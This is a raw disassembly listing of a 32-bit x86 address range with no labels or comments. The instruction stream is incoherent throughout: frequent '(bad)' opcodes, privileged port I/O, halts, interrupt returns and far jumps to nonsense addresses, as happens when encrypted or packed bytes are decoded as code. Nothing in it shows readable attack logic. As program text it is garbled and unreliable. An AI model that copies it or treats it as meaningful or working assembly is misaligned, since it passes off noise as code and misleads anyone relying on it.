  403670:	fld    QWORD PTR [ecx]
  403672:	out    0x6,eax
  403674:	add    al,0xc7
  403676:	rol    cl,1
  403678:	add    cl,ch
  40367a:	std    
  40367b:	add    ebx,edi
  40367d:	out    dx,eax
  40367e:	shr    BYTE PTR [edi-0x1b151f31],cl
  403684:	ret    0xf5b5
  403687:	aam    0xf4
  403689:	aam    0xbc
  40368b:	mov    edx,0xdfe00302
  403690:	push   es
  403691:	sar    DWORD PTR [ebp+0x307c3de],cl
  403697:	or     dh,al
  403699:	loope  0x4036a8
  40369b:	adc    al,BYTE PTR [ebx]
  40369d:	ret    0xace1
  4036a0:	(bad)  
  4036a1:	out    dx,al
  4036a2:	xlat   BYTE PTR ds:[ebx]
  4036a3:	ror    bh,cl
  4036a5:	fidiv  DWORD PTR [ebp-0x52a1b2b]
  4036ab:	mov    edi,0xefb6becd
  4036b0:	(bad)  
  4036b2:	mov    ebp,0x1f1dcc6
  4036b7:	cli    
  4036b8:	(bad)  
  4036b9:	aam    0xc2
  4036bb:	fdiv   st,st(3)
  4036bd:	jecxz  0x40366e
  4036bf:	loop   0x403682
  4036c1:	mov    bh,0xf6
  4036c3:	int    0xec
  4036c5:	iret   
  4036c6:	stc    
  4036c7:	out    dx,al
  4036c8:	iret   
  4036c9:	hlt    
  4036ca:	mov    dl,0xf9
  4036cc:	(bad)  
  4036ce:	ret    0xb8d5
  4036d1:	rcl    al,0x0
  4036d4:	loop   0x4036bf
  4036d6:	(bad)  
  4036d7:	les    ecx,FWORD PTR [edx]
  4036d9:	aam    0xf
  4036db:	iret   
  4036dc:	add    eax,0xcdb7bfed
  4036e1:	mov    bl,0xeb
  4036e3:	mov    ebx,0xecd3cbe4
  4036e8:	jmp    0x4036b2
  4036ea:	fdivp  st(7),st
  4036ec:	shl    dl,1
  4036ee:	(bad)  
  4036ef:	repnz test DWORD PTR [ebx],0xf605dacc
  4036f6:	aad    0xe0
  4036f8:	hlt    
  4036f9:	into   
  4036fa:	repz out dx,eax
  4036fc:	cld    
  4036fd:	mov    esi,0xf5f1e4e7
  403702:	int    0xe0
  403704:	jmp    0xe3f4:0xcfc8fbd1
  40370b:	(bad)  
  40370d:	std    
  40370e:	mov    edx,0xba02e7d6
  403713:	out    0xe1,eax
  403715:	jmp    0x4036ff
  403717:	or     esi,edi
  403719:	jecxz  0x403702
  40371b:	shl    edx,cl
  40371d:	(bad)  [ebx+edx*8-0x52242817]
  403724:	repz call 0xca2f05f2
  40372a:	test   esp,0xb8eff902
  403730:	in     al,dx
  403731:	out    0x3,eax
  403733:	aam    0xf5
  403735:	(bad)  
  403737:	std    
  403738:	jmp    0xb8de:0xcd0dc4db
  40373f:	call   0xd40c0202
  403744:	aam    0xd3
  403746:	out    dx,eax
  403747:	stc    
  403748:	in     eax,0xd3
  40374a:	std    
  40374b:	cld    
  40374c:	repnz cmc 
  40374e:	mov    esi,0xd9c206e3
  403753:	(bad)  
  403755:	std    
  403756:	idiv   edi
  403758:	add    BYTE PTR [esi],cl
  40375a:	jmp    0xaec5:0xb2d808fc
  403761:	retf   
  403762:	out    0xf1,eax
  403764:	in     al,dx
  403765:	vpor   ymm6,ymm6,ymm3
  403769:	cli    
  40376a:	icebp  
  40376b:	out    dx,eax
  40376c:	mov    esi,0xd8ceeddf
  403771:	add    eax,DWORD PTR [ecx]
  403773:	mul    edi
  403775:	loopne 0x40373f
  403777:	(bad)  
  403778:	mov    esp,0xcde9ccf9
  40377d:	(bad)  
  40377f:	mov    bh,0xe1
  403781:	xlat   BYTE PTR ds:[ebx]
  403782:	hlt    
  403783:	int    0xc4
  403785:	into   
  403786:	int3   
  403787:	aad    0xda
  403789:	sar    al,cl
  40378b:	neg    ebx
  40378d:	fcomi  st,st(2)
  40378f:	(bad)  
  403790:	out    0x3,eax
  403792:	aam    0xa
  403794:	aam    0xff
  403796:	enter  0x203,0xef
  40379a:	fsubp  st(5),st
  40379c:	loope  0x40375d
  40379e:	mov    ebp,0xecc2b6ce
  4037a3:	int3   
  4037a4:	jmp    0x40376f
  4037a6:	int    0xdb
  4037a8:	jmp    0x40379f
  4037aa:	in     eax,dx
  4037ab:	aam    0xfb
  4037ad:	idiv   edi
  4037af:	fxch   st(4)
  4037b1:	aam    0xf2
  4037b3:	jmp    0xedfd:0xede08f1
  4037ba:	mov    BYTE PTR [ecx],0xe
  4037bd:	mov    ecx,0xc4d0aeac
  4037c2:	repnz mov dh,0xe1
  4037c6:	rol    edi,1
  4037c8:	cmc    
  4037c9:	leave  
  4037ca:	f2xm1  
  4037cc:	mov    ebp,0xbcddd0fb
  4037d1:	stc    
  4037d2:	(bad)  
  4037d3:	loopne 0x4037da
  4037d5:	(bad)  
  4037d6:	sar    ah,1
  4037d8:	clc    
  4037d9:	add    cl,al
  4037db:	(bad)  
  4037dd:	repz test al,0xd2
  4037e0:	mov    cl,0xd0
  4037e2:	jmp    0xea1523a7
  4037e7:	mov    ch,0xf4
  4037e9:	ror    dl,1
  4037eb:	retf   
  4037ec:	jmp    0xd4ff:0xf8cdeef4
  4037f3:	clc    
  4037f4:	loopne 0x4037c6
  4037f6:	cmc    
  4037f7:	retf   0xdafc
  4037fa:	or     al,0x0
  4037fc:	or     edx,eax
  4037fe:	into   
  4037ff:	call   0xd12c1bcd
  403804:	in     eax,0xba
  403806:	mov    ecx,0xe4beffe4
  40380b:	rol    dl,1
  40380d:	jmp    0x51cf0d2
  403812:	lds    eax,FWORD PTR [edx*8-0x213e2237]
  403819:	in     al,dx
  40381a:	into   
  40381b:	pop    es
  40381c:	or     esp,esp
  40381e:	test   edi,0xf5dccfc3
  403824:	mul    bh
  403826:	(bad)
  403829:	imul   ecx
  40382b:	fbstp  TBYTE PTR [ebp+edx*8+0x2ddf4e8]
  403832:	faddp  st(1),st
  403834:	loopne 0x4037f8
  403836:	pop    es
  403837:	paddd  mm1,mm5
  40383a:	fcmovne st,st(3)
  40383c:	or     esi,ebx
  40383e:	stos   BYTE PTR es:[edi],al
  40383f:	out    0xe3,al
  403841:	repnz out 0xc0,al
  403844:	int3   
  403845:	shl    ebp,1
  403847:	mov    al,0xf4
  403849:	mov    ah,0xcc
  40384b:	repz leave 
  40384d:	out    dx,al
  40384e:	inc    BYTE PTR [esi]
  403850:	out    0xf3,al
  403852:	ret    
  403853:	test   al,0x7
  403856:	call   0xe1093d6a
  40385b:	repz fcmovb st,st(1)
  40385e:	shl    BYTE PTR [eax-0x4b392b18],1
  403864:	shl    ebx,1
  403866:	shl    DWORD PTR [esi-0x271c2726],cl
  40386c:	rcr    bl,1
  40386e:	sti    
  40386f:	mov    ecx,0xf5e4f2e7
  403874:	dec    dl
  403876:	cld    
  403877:	les    edi,FWORD PTR [ebx+ecx*1-0x1cf9fc15]
  40387e:	loopne 0x403825
  403880:	leave  
  403881:	retf   
  403882:	fdiv   QWORD PTR [eax-0x480d502a]
  403888:	not    dl
  40388a:	mov    ah,0xce
  40388c:	mov    ah,0x0
  40388e:	loope  0x403896
  403890:	std    
  403891:	fld    DWORD PTR [esi+edi*8]
  403894:	(bad)  
  403896:	or     bh,dh
  403898:	(bad)  
  403899:	out    dx,al
  40389a:	add    edi,ebp
  40389c:	loop   0x403870
  40389e:	ret    
  40389f:	mov    esi,0xeac9eff2
  4038a4:	(bad)  
  4038a5:	fcmovnb st,st(6)
  4038a7:	int    0xc9
  4038a9:	in     eax,dx
  4038aa:	hlt    
  4038ab:	aad    0xc2
  4038ad:	hlt    
  4038ae:	stc    
  4038af:	sar    eax,cl
  4038b1:	mov    ebp,0xc6f80ae1
  4038b6:	push   es
  4038b7:	leave  
  4038b8:	cld    
  4038b9:	(bad)  
  4038ba:	int    0xe
  4038bc:	repz jmp 0xb6ed:0xcaaecbeb
  4038c4:	out    0xcd,al
  4038c6:	mov    ah,0xd8
  4038c8:	mov    dh,0xf7
  4038ca:	std    
  4038cb:	add    bl,cl
  4038cd:	xlat   BYTE PTR ds:[ebx]
  4038ce:	int3   
  4038cf:	fld    QWORD PTR [edi]
  4038d1:	pop    es
  4038d2:	fcom   st(6)
  4038d4:	fsub   st(2),st
  4038d6:	(bad)  
  4038d8:	aad    0xe7
  4038da:	pop    es
  4038db:	add    al,0xf1
  4038dd:	rcr    edi,0xe6
  4038e0:	not    bl
  4038e2:	in     al,0xe5
  4038e4:	loope  0x4038d2
  4038e6:	sar    bl,cl
  4038e8:	std    
  4038e9:	in     al,dx
  4038ea:	sar    bl,1
  4038ec:	jmp    0xd0e2:0xe6f9bdb9
  4038f3:	mov    ebp,0xeec8c2c5
  4038f8:	iret   
  4038f9:	jmp    0xed301efc
  4038fe:	mov    eax,0xacb1f2cb
  403903:	int    0xb6
  403905:	out    dx,al
  403906:	aad    0xd5
  403908:	test   ch,0xfd
  40390b:	idiv   ah
  40390d:	icebp  
  40390e:	ret    
  40390f:	out    0xc1,eax
  403911:	in     eax,dx
  403912:	(bad)  
  403913:	cld    
  403914:	ret    0xdad6
  403917:	add    bh,bl
  403919:	(bad)  
  40391b:	out    dx,al
  40391c:	int    0xca
  40391e:	mov    ebp,0xd6caebc0
  403923:	mov    dh,0xe8
  403925:	(bad)  
  403926:	mov    ah,0xc5
  403928:	cmc    
  403929:	enter  0xbad8,0xfb
  40392d:	loope  0x403904
  40392f:	mov    ch,0xd2
  403931:	rcl    al,cl
  403933:	sar    cl,1
  403935:	clc    
  403936:	add    ch,al
  403938:	add    dh,al
  40393a:	or     eax,0xa8f0f2c4
  40393f:	loopne 0x40392b
  403941:	mov    bl,0xd6
  403943:	mov    cl,0xb1
  403945:	int3   
  403946:	mov    cl,0xfb
  403948:	cmc    
  403949:	hlt    
  40394a:	push   ebp
  40394c:	rol    BYTE PTR [edx],1
  40394e:	out    dx,eax
  40394f:	int    0xc1
  403951:	(bad)  
  403952:	rol    edi,cl
  403954:	mov    eax,0xf4e2030a
  403959:	fadd   QWORD PTR [ecx*1-0x38522132]
  403960:	mov    ebp,0xb4eaf4ed
  403965:	cmc    
  403966:	int    0xf6
  403968:	sti    
  403969:	leave  
  40396a:	out    dx,al
  40396b:	retf   0xfbcf
  40396e:	test   eax,0xfdd5f3f2
  403974:	in     eax,0x8
  403976:	(bad)  
  403977:	cli    
  403978:	rol    bh,0xc8
  40397b:	fxch   st(3)
  40397d:	mov    edi,0xb6c2c3d0
  403982:	imul   DWORD PTR [ecx-0x1205254a]
  403988:	imul   ecx
  40398a:	mov    dl,0xf6
  40398c:	cld    
  40398d:	mov    ebp,0xbed7e7ce
  403992:	xlat   BYTE PTR ds:[ebx]
  403993:	jmp    eax
  403995:	add    DWORD PTR ds:0xecfac6e3,eax
  40399b:	leave  
  40399c:	leave  
  40399d:	mov    ebx,0xc5cceace
  4039a3:	hlt    
  4039a4:	(bad)  
  4039a5:	mov    cl,0xc0
  4039a7:	(bad)  
  4039a9:	cli    
  4039aa:	mov    ecx,0xbab7cfdc
  4039af:	out    dx,eax
  4039b0:	rol    cl,1
  4039b2:	ret    
  4039b3:	clc    
  4039b4:	fcmovnbe st,st(5)
  4039b6:	add    eax,0xcfd4fffa
  4039bb:	(bad)  
  4039bd:	in     eax,dx
  4039be:	int3   
  4039bf:	loope  0x4039b2
  4039c1:	lods   eax,DWORD PTR ds:[esi]
  4039c2:	mov    al,0xcd
  4039c5:	(bad)  
  4039c6:	ror    edx,1
  4039c8:	leave  
  4039c9:	xlat   BYTE PTR ds:[ebx]
  4039ca:	fcmovnu st,st(1)
  4039cc:	rcl    ebp,cl
  4039ce:	sti    
  4039cf:	fdivp  st(0),st
  4039d1:	in     eax,dx
  4039d2:	lock or esi,esi
  4039d5:	(bad)  
  4039d6:	(bad)  
  4039d7:	cli    
  4039d8:	clc    
  4039d9:	jmp    0x4039b4
  4039db:	jmp    0x4039d0
  4039dd:	mov    edi,0xc8c7ded0
  4039e2:	in     eax,0xcf
  4039e4:	call   0xd11af599
  4039e9:	xlat   BYTE PTR ds:[ebx]
  4039ea:	leave  
  4039eb:	retf   
  4039ec:	stc    
  4039ed:	mov    ebx,0xbcfbcdc2
  4039f2:	mul    dh
  4039f4:	repnz jmp 0xe60b:0xfe0304e2
  4039fc:	stc    
  4039fd:	mov    edi,0xe7cccfbe
  403a02:	in     eax,0xc9
  403a04:	retf   0xcdd9
  403a07:	(bad)  
  403a08:	lock iret 
  403a0a:	div    edx
  403a0c:	cmc    
  403a0d:	std    
  403a0e:	add    esi,DWORD PTR [ebp-0x283f0543]
  403a14:	fisttp QWORD PTR [ebx]
  403a16:	stc    
  403a17:	in     eax,0xc7
  403a19:	in     eax,0xe9
  403a1b:	retf   
  403a1c:	retf   
  403a1d:	(bad)  
  403a1e:	lods   al,BYTE PTR ds:[esi]
  403a1f:	repnz icebp 
  403a21:	stos   DWORD PTR es:[edi],eax
  403a22:	jecxz  0x403a04
  403a24:	(bad)  
  403a25:	cli    
  403a26:	iret   
  403a27:	in     al,0xb5
  403a29:	in     eax,0xf8
  403a2b:	stc    
  403a2c:	std    
  403a2d:	jecxz  0x403a2b
  403a2f:	lock xlat BYTE PTR ds:[ebx]
  403a31:	out    0xdb,eax
  403a33:	repnz hlt 
  403a35:	lock clc 
  403a37:	or     ah,ah
  403a39:	push   cs
  403a3a:	jmp    0xaf252e1c
  403a3f:	jmp    0xec121d0e
  403a44:	repnz mov cl,0xb8
  403a47:	repz fdivr DWORD PTR [esi-0x1d443147]
  403a4e:	in     eax,dx
  403a4f:	loope  0x403a29
  403a51:	std    
  403a52:	cli    
  403a53:	loop   0x403a53
  403a55:	loop   0x403a32
  403a57:	(bad)  
  403a58:	(bad)
  403a5c:	or     al,0xc5
  403a5e:	xlat   BYTE PTR ds:[ebx]
  403a5f:	(bad)
  403a62:	stos   BYTE PTR es:[edi],al
  403a63:	mov    al,0xb3
  403a65:	xlat   BYTE PTR ds:[ebx]
  403a66:	enter  0xcbad,0xda
  403a6a:	cmc    
  403a6b:	aam    0xdc
  403a6d:	loop   0x403a5d
  403a6f:	idiv   al
  403a71:	(bad)
  403a74:	stc    
  403a75:	mul    ecx
  403a77:	cli    
  403a78:	or     cl,bh
  403a7a:	fldl2e 
  403a7c:	adc    bl,ch
  403a7e:	fsubr  QWORD PTR [edi-0x3e48481f]
  403a84:	in     eax,0xb9
  403a86:	mov    dh,0xec
  403a88:	aad    0xc5
  403a8a:	jmp    0xe93c1a77
  403a8f:	fcomip st,st(2)
  403a91:	(bad)  
  403a92:	ret    0xd0e7
  403a95:	idiv   ch
  403a97:	pop    es
  403a98:	in     al,0xda
  403a9a:	std    
  403a9b:	ror    DWORD PTR [ecx],0xd9
  403a9e:	in     al,0xb1
  403aa0:	mov    bl,0xc6
  403aa2:	iret   
  403aa3:	in     al,dx
  403aa4:	(bad)  
  403aa5:	in     eax,0xcf
  403aa7:	iret   
  403aa8:	jmp    0xd5e2:0xd3f6b6d0
  403aaf:	cld    
  403ab0:	int    0xf2
  403ab2:	mov    ebp,0xef0ae706
  403ab7:	imul   dh
  403ab9:	add    esp,eax
  403abb:	int3   
  403abc:	add    bh,BYTE PTR [edi-0x38161843]
  403ac2:	scas   al,BYTE PTR es:[edi]
  403ac3:	out    0xc5,al
  403ac5:	stc    
  403ac6:	mov    bh,0xe7
  403ac8:	(bad)  
  403ac9:	in     al,0xb9
  403acb:	loop   0x403aa8
  403acd:	icebp  
  403ace:	add    al,dl
  403ad0:	ret    0xfac2
  403ad3:	jmp    0xf5e1:0xe7c5f7dd
  403ada:	(bad)  
  403adb:	in     eax,dx
  403adc:	int    0xd3
  403ade:	leave  
  403adf:	lock shl ah,cl
  403ae2:	test   edx,0xb0f2faf2
  403ae8:	mov    edx,0xe2d6c9f4
  403aed:	stc    
  403aee:	jecxz  0x403ae6
  403af0:	mov    esp,0xd0d4e3fa
  403af5:	aad    0xf0
  403af7:	out    0xd5,al
  403af9:	fstp   st(1)
  403afb:	adc    edx,DWORD PTR [edx]
  403afd:	test   al,0xc6
  403aff:	mov    dl,0xe1
  403b01:	(bad)  
  403b02:	repz aam 0xb0
  403b05:	mov    ecx,0xcafdfff5
  403b0a:	stc    
  403b0b:	cmc    
  403b0c:	fucom  st(1)
  403b0e:	ror    ah,0xe2
  403b11:	loopne 0x403b11
  403b13:	xlat   BYTE PTR ds:[ebx]
  403b14:	retf   0xdd07
  403b17:	loopne 0x403b0d
  403b19:	aam    0xd8
  403b1b:	(bad)  
  403b1c:	loope  0x403b04
  403b1e:	(bad)  
  403b1f:	call   0xc41404f2
  403b24:	retf   
  403b25:	mov    dl,0xfa
  403b27:	in     eax,0xb9
  403b29:	mov    ecx,0xeef9ceb5
  403b2e:	(bad)  
  403b30:	cli    
  403b31:	repnz fadd QWORD PTR [ecx]
  403b34:	add    edi,ebp
  403b36:	mov    DWORD PTR [esi],0x40f0de3
  403b3c:	cli    
  403b3d:	out    dx,al
  403b3e:	(bad)  
  403b40:	shr    DWORD PTR [ebx+edx*8-0x26493f1e],1
  403b47:	stc    
  403b48:	mov    ch,0xb4
  403b4a:	rcr    ebx,cl
  403b4c:	aam    0xee
  403b4e:	ret    
  403b4f:	dec    ah
  403b51:	loopne 0x403b59
  403b53:	loope  0x403b3e
  403b55:	in     al,0xcb
  403b57:	loop   0x403b67
  403b59:	cld    
  403b5a:	clc    
  403b5b:	int    0xff
  403b5d:	fadd   st(4),st
  403b5f:	lock enter 0xe4dd,0xee
  403b64:	repz call 0xe61fec58
  403b6a:	les    eax,FWORD PTR [ebx]
  403b6c:	fcomp  st(1)
  403b6e:	rcl    ecx,0xee
  403b71:	aad    0xf1
  403b73:	fsubrp st(3),st
  403b75:	ret    0xad6
  403b78:	cmc    
  403b79:	sti    
  403b7a:	retf   
  403b7b:	clc    
  403b7c:	retf   0xefcd
  403b7f:	mov    bh,0xc8
  403b81:	iret   
  403b82:	into   
  403b83:	sti    
  403b84:	ror    al,0xbb
  403b87:	(bad)  
  403b88:	mov    edi,0xb0d0e8b9
  403b8d:	mov    edi,0xbbe5efd0
  403b92:	add    bl,ah
  403b94:	lds    edi,FWORD PTR [edi-0x3c1c1cfb]
  403b9a:	pmulhw mm4,mm3
  403b9d:	into   
  403b9e:	out    dx,eax
  403b9f:	shr    esi,1
  403ba1:	retf   
  403ba2:	fucomi st,st(3)
  403ba4:	cli    
  403ba5:	leave  
  403ba6:	mov    ebx,0xb5bdb5ca
  403bab:	mov    ah,0xdb
  403bad:	mul    edi
  403baf:	ret    0xe7db
  403bb2:	add    al,0xe3
  403bb4:	mov    esp,0x705fddf
  403bb9:	in     al,dx
  403bba:	add    eax,0xb3dce1f8
  403bbf:	xlat   BYTE PTR ds:[ebx]
  403bc0:	ror    dh,0xd2
  403bc3:	imul   bl
  403bc5:	retf   0xefc8
  403bc8:	mov    bh,0xdf
  403bca:	mov    ch,0xd1
  403bcc:	mov    edi,0xc7b801e9
  403bd1:	in     eax,0xe5
  403bd3:	jmp    0xd9c4:0xe6dbd4d8
  403bda:	jmp    0xd22effe1
  403bdf:	mov    esi,0xeeaecdaf
  403be4:	aad    0xc4
  403be6:	(bad)  
  403be7:	sti    
  403be8:	clc    
  403be9:	leave  
  403bea:	cmc    
  403beb:	aad    0xb0
  403bed:	sti    
  403bee:	loope  0x403bcb
  403bf0:	(bad)  
  403bf1:	std    
  403bf2:	icebp  
  403bf3:	repz dec dl
  403bf6:	pop    es
  403bf7:	cmc    
  403bf8:	hlt    
  403bf9:	hlt    
  403bfa:	leave  
  403bfb:	add    eax,0xdcadaf02
  403c00:	fsubp  st(1),st
  403c02:	hlt    
  403c03:	lods   eax,DWORD PTR ds:[esi]
  403c04:	mul    edi
  403c06:	rol    ch,cl
  403c08:	retf   
  403c09:	retf   0xfabe
  403c0c:	add    esi,DWORD PTR [edi-0x38041341]
  403c12:	bnd ret 0xf7e6
  403c16:	retf   0xd402
  403c19:	or     esp,ecx
  403c1b:	pop    es
  403c1c:	jmp    0x403beb
  403c1e:	into   
  403c1f:	loope  0x403c0e
  403c21:	cmc    
  403c22:	mov    cl,0xe4
  403c24:	stc    
  403c25:	rol    al,1
  403c27:	mov    ah,0xdb
  403c29:	sar    DWORD PTR [ebx-0x46481e32],1
  403c2f:	sar    edi,cl
  403c31:	out    0xf0,al
  403c33:	idiv   ah
  403c35:	jmp    0x403c1b
  403c37:	(bad)  
  403c39:	or     al,BYTE PTR [ecx+eax*8]
  403c3c:	pop    es
  403c3d:	in     al,0xdc
  403c3f:	in     al,dx
  403c40:	jmp    0x403c25
  403c42:	retf   
  403c43:	int3   
  403c44:	fcmovu st,st(1)
  403c46:	enter  0xd3f7,0xb3
  403c4a:	std    
  403c4b:	mov    ecx,0xc1eeee01
  403c50:	fcmovnu st,st(7)
  403c52:	(bad)  
  403c54:	aad    0x7
  403c56:	cld    
  403c57:	std    
  403c58:	jecxz  0x403c35
  403c5a:	enter  0xcce9,0xe6
  403c5e:	fst    st(0)
  403c60:	(bad)  
  403c61:	rol    bh,cl
  403c63:	hlt    
  403c64:	aad    0xcf
  403c66:	sti    
  403c67:	in     al,dx
  403c68:	aam    0xee
  403c6a:	stc    
  403c6b:	leave  
  403c6c:	ret    0xcddb
  403c6f:	rcl    esp,0xf5
  403c72:	in     eax,0xeb
  403c74:	retf   0xcbde
  403c77:	ror    DWORD PTR [edx],0xf9
  403c7a:	ret    0xcaef
  403c7d:	mov    bl,0xe2
  403c7f:	(bad)  
  403c80:	rol    ebp,1
  403c82:	int3   
  403c83:	ret    0xedec
  403c86:	mov    edx,0xdcebecc4
  403c8b:	stc    
  403c8c:	ret    
  403c8d:	jecxz  0x403c5e
  403c8f:	clc    
  403c90:	mov    edi,0x6c3d0bc
  403c95:	fadd   st(2),st
  403c97:	(bad)  
  403c99:	into   
  403c9a:	push   cs
  403c9b:	(bad)
  403c9e:	icebp  
  403c9f:	loopne 0x403c89
  403ca1:	jecxz  0x403c54
  403ca3:	in     eax,dx
  403ca4:	mov    bl,0xc1
  403ca6:	retf   0xf7cf
  403ca9:	fdivr  st(6),st
  403cab:	xlat   BYTE PTR ds:[ebx]
  403cac:	sar    bl,cl
  403cae:	cld    
  403caf:	fcom   st(6)
  403cb1:	add    eax,edx
  403cb3:	loopne 0x403c99
  403cb5:	(bad)  
  403cb6:	out    dx,eax
  403cb7:	shr    al,0xc5
  403cba:	call   0xbf2d178a
  403cbf:	imul   cl
  403cc1:	stos   DWORD PTR es:[edi],eax
  403cc2:	mov    bl,0xb7
  403cc4:	lock hlt 
  403cc6:	mov    cl,0xad
  403cc8:	in     eax,dx
  403cc9:	int    0xf2
  403ccb:	(bad)  
  403ccc:	hlt    
  403ccd:	in     eax,dx
  403cce:	(bad)  
  403cd0:	icebp  
  403cd1:	test   ebp,0x3c9fdbd
  403cd7:	sti    
  403cd8:	std    
  403cd9:	dec    bh
  403cdb:	iret   
  403cdc:	pop    es
  403cdd:	lds    esi,FWORD PTR [ecx-0x3435524f]
  403ce3:	loope  0x403ca6
  403ce5:	mov    bl,0xd7
  403ce7:	int3   
  403ce8:	clc    
  403ce9:	into   
  403cea:	sti    
  403ceb:	cmc    
  403cec:	(bad)  
  403ced:	mov    esi,0xccf4d7bf
  403cf2:	or     eax,DWORD PTR [esi]
  403cf4:	(bad)  
  403cf5:	stc    
  403cf6:	(bad)  
  403cf7:	fld    DWORD PTR [ecx]
  403cf9:	cld    
  403cfa:	push   es
  403cfb:	int3   
  403cfc:	adc    DWORD PTR [edx-0x9284231],ebp
  403d02:	fsub   st(5),st
  403d04:	retf   
  403d05:	mov    al,0xf1
  403d07:	test   dh,0xbe
  403d0a:	jmp    0x403d02
  403d0c:	ret    
  403d0d:	add    eax,ebx
  403d0f:	mov    ecx,0xf7bdc606
  403d14:	or     ebx,edi
  403d16:	(bad)  
  403d17:	or     eax,ebp
  403d19:	fxch   st(5)
  403d1b:	adc    bl,bh
  403d1d:	lds    ebp,FWORD PTR [esi-0xd492e17]
  403d23:	bnd ret 0xb5e1
  403d27:	(bad)  
  403d28:	jmp    0xe0393509
  403d2d:	cld    
  403d2e:	mov    ebp,0xe0d9f9b5
  403d33:	repz retf 0xe2e3
  403d37:	retf   
  403d38:	out    0x3,eax
  403d3a:	jmp    0xdd132b4b
  403d3f:	test   eax,0xd4f5d4c7
  403d44:	retf   0xc0f8
  403d47:	jmp    0xf1ff:0xcef2f9d8
  403d4e:	xlat   BYTE PTR ds:[ebx]
  403d4f:	pop    es
  403d50:	fcmovbe st,st(0)
  403d52:	aam    0xd1
  403d54:	mov    eax,0xe2ded609
  403d59:	fldlg2 
  403d5b:	shl    ecx,cl
  403d5d:	retf   0xf7cc
  403d60:	cmc    
  403d61:	(bad)  
  403d62:	aad    0xc9
  403d64:	test   al,0xc1
  403d66:	aad    0xff
  403d68:	in     eax,dx
  403d69:	div    eax
  403d6b:	std    
  403d6c:	mov    esp,0xcef0cdc9
  403d71:	(bad)  
  403d72:	fsubrp st(1),st
  403d74:	ret    
  403d75:	vpmulhuw ymm3,ymm4,ymm0
  403d79:	fcomi  st,st(4)
  403d7b:	sti    
  403d7c:	in     al,0xea
  403d7e:	(bad)
  403d81:	mov    al,0xc4
  403d83:	mov    bl,0xb7
  403d85:	mov    ebx,0xbabfb5b1
  403d8a:	fidivr WORD PTR [edi-0x123e0a28]
  403d90:	fnclex 
  403d92:	(bad)  
  403d94:	add    ecx,DWORD PTR [eax]
  403d96:	loopne 0x403d8d
  403d98:	add    dh,cl
  403d9a:	int3   
  403d9b:	into   
  403d9c:	pop    es
  403d9d:	call   0xedfd2699
  403da2:	fmul   st(7),st
  403da4:	out    0xe8,al
  403da6:	cli    
  403da7:	fstp   TBYTE PTR [eax-0x3052a2d]
  403dad:	aam    0xfe
  403daf:	mov    esp,0xd6dd06d9
  403db4:	hlt    
  403db5:	or     dh,bh
  403db7:	add    bh,al
  403db9:	cld    
  403dba:	or     ah,ch
  403dbc:	into   
  403dbd:	stos   BYTE PTR es:[edi],al
  403dbe:	mov    edi,0xe9d5e2cc
  403dc3:	retf   0xf1d1
  403dc6:	fcos   
  403dc8:	(bad)  
  403dca:	rcl    ecx,1
  403dcc:	mov    esp,0x5dde2df
  403dd1:	fsubr  st(2),st
  403dd3:	(bad)  
  403dd4:	loopne 0x403d9a
  403dd6:	faddp  st(7),st
  403dd8:	add    al,0xf5
  403dda:	aam    0xdb
  403ddc:	loope  0x403d8b
  403dde:	ret    0xb0c6
  403de1:	fucomp st(5)
  403de3:	mov    bh,0xd5
  403de5:	bnd jmp 0xcb2a10c6
  403deb:	clc    
  403dec:	int    0xe0
  403dee:	out    dx,eax
  403def:	shr    dh,0xe7
  403df2:	rol    BYTE PTR [ebx],0x5
  403df5:	lock (bad) 
  403df8:	or     ah,dh
  403dfa:	pop    es
  403dfb:	out    0xe0,al
  403dfd:	icebp  
  403dfe:	(bad)  
  403e00:	iret   
  403e01:	scas   eax,DWORD PTR es:[edi]
  403e02:	(bad)  
  403e03:	loope  0x403dde
  403e05:	rcl    ecx,0xca
  403e08:	cli    
  403e09:	iret   
  403e0a:	fcmovnb st,st(3)
  403e0c:	fstp   TBYTE PTR [edx-0x38280a03]
  403e12:	ret    0xaf3
  403e15:	lds    eax,FWORD PTR [esi]
  403e17:	(bad)  
  403e19:	std    
  403e1a:	jmp    0xb02523f9
  403e1f:	out    0xad,eax
  403e21:	loope  0x403ddf
  403e23:	loope  0x403dfa
  403e25:	mov    bl,0xd9
  403e27:	call   0xde3923e1
  403e2c:	repz rcr edx,0xbd
  403e30:	int3   
  403e31:	shl    esi,cl
  403e33:	push   es
  403e34:	add    DWORD PTR [eax],eax
  403e36:	retf   0xe3d8
  403e39:	hlt    
  403e3a:	retf   0xcbcd
  403e3d:	fild   QWORD PTR [ebx+ecx*8-0x2b2d3d24]
  403e44:	lods   al,BYTE PTR ds:[esi]
  403e45:	in     al,dx
  403e46:	fmul   st,st(0)
  403e48:	mov    edi,0xd4d3ffde
  403e4d:	fsubp  st(7),st
  403e4f:	out    dx,al
  403e50:	cli    
  403e51:	jecxz  0x403e59
  403e53:	ror    edx,0xc1
  403e56:	fdivrp st(4),st
  403e58:	sti    
  403e59:	out    0xed,eax
  403e5b:	jmp    0xe60d3158
  403e60:	mov    esi,0xb0b2b6c8
  403e65:	cmc    
  403e66:	enter  0xcfef,0xca
  403e6a:	mov    edi,0xc2e002ed
  403e6f:	aam    0xf8
  403e71:	(bad)  
  403e73:	rol    DWORD PTR [edi],cl
  403e75:	add    esi,ebp
  403e77:	jmp    0xaae3:0xcadde706
  403e7e:	out    dx,al
  403e7f:	loope  0x403e31
  403e81:	retf   0xbbb1
  403e84:	mov    cl,0xf4
  403e86:	sti    
  403e87:	stc    
  403e88:	hlt    
  403e89:	icebp  
  403e8a:	clc    
  403e8b:	aam    0xdf
  403e8d:	in     eax,dx
  403e8e:	sti    
  403e8f:	repnz loopne 0x403e55
  403e92:	add    edi,ebx
  403e94:	aad    0xcb
  403e96:	std    
  403e97:	xlat   BYTE PTR ds:[ebx]
  403e98:	or     edi,edi
  403e9a:	(bad)  
  403e9b:	sti    
  403e9c:	in     eax,0xe2
  403e9e:	jmp    0x403e4d
  403ea0:	icebp  
  403ea1:	ret    0xf2c4
  403ea4:	retf   
  403ea5:	mov    al,0xae
  403ea7:	mov    eax,0xefeee5b9
  403eac:	std    
  403ead:	mov    edi,0xf3bff5dd
  403eb2:	(bad)  
  403eb3:	sti    
  403eb4:	cld    
  403eb5:	or     esp,edi
  403eb7:	iret   
  403eb8:	enter  0xd80e,0x4
  403ebc:	cld    
  403ebd:	rol    eax,cl
  403ebf:	into   
  403ec0:	mov    ebp,0xcec2c0af
  403ec5:	fdiv   DWORD PTR [eax-0x301b2e1b]
  403ecb:	(bad)  
  403ecc:	(bad)  
  403ecd:	mov    esi,0xe1cccefd
  403ed2:	stc    
